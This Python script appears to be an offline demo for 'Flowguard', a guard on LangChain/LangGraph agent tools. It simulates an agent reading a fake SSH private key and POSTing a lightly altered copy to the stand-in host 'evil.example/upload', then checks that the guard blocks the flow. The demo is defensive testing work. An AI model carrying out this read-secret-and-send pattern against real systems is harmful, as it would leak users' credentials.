from __future__ import annotations

import argparse
import sys
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, TextIO
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime, FlowguardTool

DEMO_SECRET = "FLOWGUARD DEMO PRIVATE KEY"
EXFILTRATION_URL = "https://evil.example/upload"


@dataclass(frozen=True, slots=True)
class LangChainDemoArtifacts:
    report_path: Path
    events_path: Path
    adapter_registered: bool
    blocked_policy: str
    network_call_count: int


def build_tools(
    runtime: FlowguardRuntime,
) -> tuple[FlowguardTool, FlowguardTool]:
    @runtime.tool(name="read_secret", description="Read a file through Flowguard.")
    def read_secret(path: str) -> str:
        with open(path, encoding="utf-8") as handle:
            return handle.read()

    @runtime.tool(name="send_report", description="Send a report through Flowguard.")
    def send_report(url: str, report: str) -> bytes:
        req = request.Request(url, data=report.encode("utf-8"), method="POST")
        return request.urlopen(req).read()

    return read_secret, send_report


def build_langchain_tools(
    read_secret: FlowguardTool,
    send_report: FlowguardTool,
) -> tuple[Any, Any]:
    """Create tools accepted by LangChain agents and LangGraph tool nodes."""

    return read_secret.as_langchain_tool(), send_report.as_langchain_tool()


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)
    run_demo(out_dir=args.out_dir, name=args.name, output=sys.stdout)
    return 0


def run_demo(
    *,
    out_dir: Path,
    name: str,
    output: TextIO,
) -> LangChainDemoArtifacts:
    out_dir.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmpdir:
        secret_path = Path(tmpdir) / "id_rsa"
        secret_path.write_text(DEMO_SECRET, encoding="utf-8")
        runtime = FlowguardRuntime(secret_paths=[secret_path])
        read_secret, send_report = build_tools(runtime)

        try:
            active_tools = build_langchain_tools(read_secret, send_report)
        except RuntimeError as err:
            active_tools = (read_secret, send_report)
            adapter_registered = False
            _print(output, f"adapter: skipped ({err})")
        else:
            adapter_registered = True
            _print(output, "adapter: LangChain/LangGraph tools registered")

        network_calls: list[str] = []
        original_urlopen = request.urlopen

        def fake_urlopen(
            req: Any,
            data: Any = None,
            *args: Any,
            **kwargs: Any,
        ) -> bytes:
            target = getattr(req, "full_url", req)
            network_calls.append(str(target))
            return b"unexpected"

        request.urlopen = fake_urlopen
        blocked_policy = ""
        try:
            secret = _invoke_tool(
                active_tools[0],
                {"path": str(secret_path)},
                adapted=adapter_registered,
            )
            transformed = secret.replace("PRIVATE", "PUBLIC").lower()
            _invoke_tool(
                active_tools[1],
                {"url": EXFILTRATION_URL, "report": transformed},
                adapted=adapter_registered,
            )
        except FlowguardBlocked as err:
            blocked_policy = err.policy
            _print(output, "Flowguard LangChain/LangGraph Demo")
            _print(output, f"result: BLOCKED {err.policy}")
            _print(output, err.explanation)
        finally:
            request.urlopen = original_urlopen

        if blocked_policy != "SecretToNetwork":
            raise AssertionError(
                f"expected SecretToNetwork, got {blocked_policy or 'no block'}"
            )
        if network_calls:
            raise AssertionError(
                f"expected zero network calls, got {len(network_calls)}"
            )

        report = runtime.report()
        report_path = out_dir / f"{name}.report.json"
        events_path = out_dir / f"{name}.events.jsonl"
        report.write_json(report_path)
        report.write_jsonl(events_path)

        _print(output, f"network_calls={len(network_calls)}")
        _print(output, "")
        _print(output, "reports:")
        _print(output, f"  {report_path}")
        _print(output, f"  {events_path}")
        _print(output, "summary:")
        _print(output, f"  violations={report.summary.violation_count}")
        _print(output, f"  allowed_sends={report.summary.allowed_send_count}")

        return LangChainDemoArtifacts(
            report_path=report_path,
            events_path=events_path,
            adapter_registered=adapter_registered,
            blocked_policy=blocked_policy,
            network_call_count=len(network_calls),
        )


def _invoke_tool(tool: Any, inputs: dict[str, Any], *, adapted: bool) -> Any:
    if adapted:
        return tool.invoke(inputs)
    return tool(**inputs)


def _parse_args(argv: list[str] | None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run the offline Flowguard LangChain/LangGraph demo."
    )
    parser.add_argument(
        "--out-dir",
        type=Path,
        default=Path("logs"),
        help="Directory where report artifacts are written.",
    )
    parser.add_argument(
        "--name",
        default="langchain-secret-leak",
        help="Base artifact name.",
    )
    return parser.parse_args(argv)


def _print(output: TextIO, text: str) -> None:
    print(text, file=output)


if __name__ == "__main__":
    raise SystemExit(main())
